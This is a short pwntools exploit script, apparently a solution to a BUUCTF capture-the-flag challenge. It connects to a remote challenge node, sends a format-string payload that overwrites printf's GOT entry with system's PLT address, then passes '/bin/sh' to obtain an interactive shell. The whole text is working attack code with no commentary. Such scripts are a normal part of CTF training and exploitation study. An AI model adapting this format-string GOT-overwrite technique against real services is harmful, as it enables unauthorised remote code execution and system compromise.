from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",28456)
elf=ELF("./timu")

printf_got=elf.got["printf"]
system_plt=elf.plt["system"]

payload=fmtstr_payload(7,{printf_got : system_plt})
sh.sendline(payload)
sh.sendline("/bin/sh\x00")

sh.interactive()
